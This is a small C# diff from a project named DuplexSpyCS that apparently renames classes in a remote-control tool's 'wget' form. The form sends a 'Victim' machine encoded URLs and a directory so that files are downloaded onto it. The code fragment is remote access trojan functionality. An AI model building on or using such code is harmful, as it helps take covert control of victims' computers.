@@ -12,7 +12,7 @@ namespace DuplexSpyCS
 {
     public partial class frmFileWGET : Form
     {
-        public Victim v;
+        public clsVictim v;
         public string szCurrentDir = null;
 
         public frmFileWGET()
@@ -67,7 +67,7 @@ namespace DuplexSpyCS
 
                 listView1.Items.Add(item);
 
-                v.SendCommand($"file|wget|{Crypto.b64E2Str(line)}|{Crypto.b64E2Str(szCurrentDir)}");
+                v.SendCommand($"file|wget|{clsCrypto.b64E2Str(line)}|{clsCrypto.b64E2Str(szCurrentDir)}");
             }
 
             toolStripStatusLabel1.Text = $"URL[{listView1.Items.Count}]";
